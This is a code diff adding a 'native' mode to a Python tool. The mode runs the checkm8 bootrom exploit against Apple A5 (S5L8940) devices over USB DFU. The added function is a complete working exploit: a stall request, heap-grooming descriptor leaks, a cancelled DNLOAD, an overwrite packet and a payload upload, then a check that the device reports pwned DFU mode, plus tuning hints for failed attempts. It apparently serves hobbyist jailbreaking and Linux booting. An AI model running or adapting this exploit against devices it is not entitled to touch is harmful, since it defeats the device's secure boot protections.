@@ -860,6 +860,163 @@ def selftest(args):
     return 0
 
 
+TR_COMPLETED = 0
+TR_STALL = 4
+
+
+def exploit_native(args):
+    """axi0mX ipwndfu host-native checkm8 sequence (exploit(), large-leak path),
+    transliterated for S5L8940/iBoot-838.3 using the a1exdandy A5 constants
+    (leak size 0x80/0x81, overwrite 0x40 bytes, payload 0x2C0 bytes).
+
+    Unlike the sketch mode (a raw-packet transliteration of the Arduino, which
+    needs packet-level tricks usbfs cannot emit), every transfer here is a
+    plain libusb control transfer, exactly like the sequence that laptop hosts
+    run against S5L8947 (iPhone 4S):
+      phase 1  req_stall + N sync descriptor leaks + no_leak, bus reset
+      phase 2  async 0x800 DNLOAD 'A' cancelled at 100us + DFU_ABORT + 0.5s
+      phase 3  req_stall + one req_leak + overwrite (bmRequestType 0x00,
+               bRequest 0x00) + payload DNLOAD in 0x800 chunks + bus reset
+      verify   re-acquire and look for PWND:[checkm8] in the serial string.
+    """
+    usb = LibUSB()
+    LibUSB._current = usb
+    payload, overwrite = load_payloads(args.payload)
+    print('*** checkm8 A5 NATIVE mode (axi0mX host sequence, 838.3 constants) ***')
+    print('payload: %s (%d bytes, sha1 %s)' % (args.payload, len(payload), sha1(payload)))
+    print('overwrite: %d bytes, sha1 %s' % (len(overwrite), sha1(overwrite)))
+
+    sys_serial = ''
+    if args.wait:
+        print('== waiting for DFU (sysfs poll, no USB traffic) ==')
+        syspath, sys_serial = sysfs_dfu(timeout=args.wait_timeout)
+        if syspath is None:
+            raise SystemExit('error: no DFU device appeared within %0.0fs'
+                             % args.wait_timeout)
+        print('DFU device appeared:', syspath)
+        if sys_serial:
+            print('sysfs serial:', sys_serial)
+    else:
+        _, sys_serial = sysfs_dfu(timeout=1.0)
+
+    dev, handle, desc, serial = acquire(usb, want_serial=not sys_serial)
+    if not sys_serial:
+        print('Found:', (serial or '').strip())
+    print('USB:', usb.describe(dev), 'iSerialNumber index:', desc.iSerialNumber)
+    if PWN_MARKER in (serial or sys_serial):
+        print('Device is already in pwned DFU mode. Nothing to do.')
+        usb.release(handle)
+        return 0
+    if desc.iSerialNumber in (0, 0xFF):
+        usb.release(handle)
+        raise SystemExit('error: invalid iSerialNumber index %d' % desc.iSerialNumber)
+    serial_idx = desc.iSerialNumber
+    usb.release(handle)
+
+    start = time.time()
+
+    # -- phase 1: req_stall, N sync leaks, no_leak, bus reset ----------------
+    print('== phase 1: req_stall + %d sync leaks (wLength 0x80) =='
+          % args.leak)
+    dev, handle, desc, serial = acquire(usb, want_serial=False)
+    if not sys_serial:
+        serial = serial or sys_serial
+    if 'CPID:%04X' % CPID_A5 not in serial:
+        usb.release(handle)
+        raise SystemExit('error: not an A5 device. Serial: %s' % serial.strip())
+    rc, info = usb.raw_ctrl(handle, 0x02, 3, 0, 0x80, 0, b'',
+                            abandon=False, timeout_ms=200, name='req_stall')
+    if args.debug:
+        debug_raw('req_stall', rc, info)
+    done = 0
+    stalls = 0
+    consecutive_stalls = 0
+    while done < args.leak:
+        rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
+                                (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                                0x80, b'', abandon=False, timeout_ms=500,
+                                name='leak %d' % done)
+        if info is not None and info[0] == TR_COMPLETED:
+            done += 1
+            consecutive_stalls = 0
+        else:
+            stalls += 1
+            consecutive_stalls += 1
+            if consecutive_stalls >= 100:
+                usb.release(handle)
+                raise SystemExit('error: %d consecutive rejected sync leaks —\n'
+                                 'iBoot-838.3 will not complete host sync descriptor\n'
+                                 'requests (stalled at %d done). The native flow needs\n'
+                                 'the 8947-style response behavior; report this'
+                                 % (consecutive_stalls, done))
+        if args.leak_delay_ms:
+            time.sleep(args.leak_delay_ms / 1000.0)
+        if done % 100 == 0 and done:
+            print('  %d/%d (rejected %d)' % (done, args.leak, stalls))
+    rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
+                            (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                            0x81, b'', abandon=False, timeout_ms=500,
+                            name='no_leak')
+    if args.debug:
+        debug_raw('no_leak', rc, info)
+    print('  leaks: %d completed, %d rejected' % (done, stalls))
+    reset_and_release(usb, handle, settle=1.0)
+
+    # -- phase 2: async DNLOAD cancelled at 100us + DFU_ABORT ---------------
+    print('== phase 2: async 0x800 DNLOAD (100us cancel) + DFU_ABORT ==')
+    dev, handle, desc, _ = acquire(usb, want_serial=False)
+    rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, 0x800, b'A' * 0x800,
+                            abandon=True, cancel_at=0, abandon_timeout_ms=0.1,
+                            timeout_ms=500, name='async DNLOAD')
+    if args.debug:
+        debug_raw('async DNLOAD', rc, info)
+    rc, info = usb.raw_ctrl(handle, 0x21, 4, 0, 0, 0, b'', abandon=False,
+                            timeout_ms=200, name='DFU_ABORT')
+    if args.debug:
+        debug_raw('DFU_ABORT', rc, info)
+    usb.release(handle)
+    time.sleep(0.5)
+
+    # -- phase 3: req_stall + req_leak + overwrite + payload ---------------
+    print('== phase 3: req_stall + req_leak + overwrite + payload ==')
+    dev, handle, desc, _ = acquire(usb, want_serial=False)
+    rc, info = usb.raw_ctrl(handle, 0x02, 3, 0, 0x80, 0, b'',
+                            abandon=False, timeout_ms=200, name='req_stall 2')
+    rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
+                            (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                            0x80, b'', abandon=False, timeout_ms=500,
+                            name='req_leak 2')
+    if args.debug:
+        debug_raw('req_leak 2', rc, info)
+    rc, info = usb.raw_ctrl(handle, 0x00, 0, 0, 0, len(overwrite), overwrite,
+                            abandon=False, timeout_ms=300, name='overwrite')
+    if args.debug:
+        debug_raw('overwrite', rc, info)
+    else:
+        print('  overwrite: status=%s actual=%s'
+              % (status_name(info[0]) if info else '?', info[1] if info else '?'))
+    for i in range(0, len(payload), 0x800):
+        chunk = payload[i:i + 0x800]
+        rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, len(chunk), chunk,
+                                abandon=False, timeout_ms=500,
+                                name='payload %#x' % i)
+        if args.debug:
+            debug_raw('payload %#x' % i, rc, info)
+    reset_and_release(usb, handle, settle=1.0)
+
+    serial = verify(usb)
+    if PWN_MARKER not in serial:
+        raise SystemExit('error: native exploit missed — no PWND in serial.\n'
+                         'Re-enter DFU (Power+Home) and retry; if it keeps\n'
+                         'missing, tune --leak around 620 (4/-16/+32), and try\n'
+                         'the overwrite with wLength 0x40 instead of 0x80\n'
+                         '(edit the phase 3 raw_ctrl call).')
+    print('Device is now in pwned DFU mode.')
+    print('(%0.2f seconds)' % (time.time() - start))
+    print('Next: ./boot/boot-linux.sh --skip-pwn')
+    return 0
+
+
 def main():
     parser = argparse.ArgumentParser(description='checkm8 A5 (S5L8940X) host pwner')
     parser.add_argument('--selftest', action='store_true', help='check payload hashes and exit')
@@ -894,6 +1051,13 @@ def main():
                              'io_buffer; 0x40-aligned, 0x40..0x780. The PC heap '
                              'layout can shift it from the Arduino value, so sweep '
                              'it in 0x40 steps (default: 0x6C0)')
+    parser.add_argument('--mode', choices=['sketch', 'native'], default='sketch',
+                        help='exploit sequence: sketch = the a1exdandy Arduino '
+                             'transliteration (stages 0-3, raw-packet shapes); '
+                             'native = the axi0mX ipwndfu host-native sequence '
+                             '(plain sync control transfers + 100us-abandoned '
+                             'DNLOAD + DFU_ABORT), never tried on 838.3 before '
+                             '(default: %(default)s)')
     parser.add_argument('--stage', choices=['all', '0', '1', '2', '3', 'verify'], default='all',
                         help='run only one stage (default: all)')
     parser.add_argument('--wait', action='store_true',
@@ -905,6 +1069,8 @@ def main():
     args = parser.parse_args()
     if args.selftest:
         return selftest(args)
+    if args.mode == 'native':
+        return exploit_native(args)
     return exploit(args)
 
 
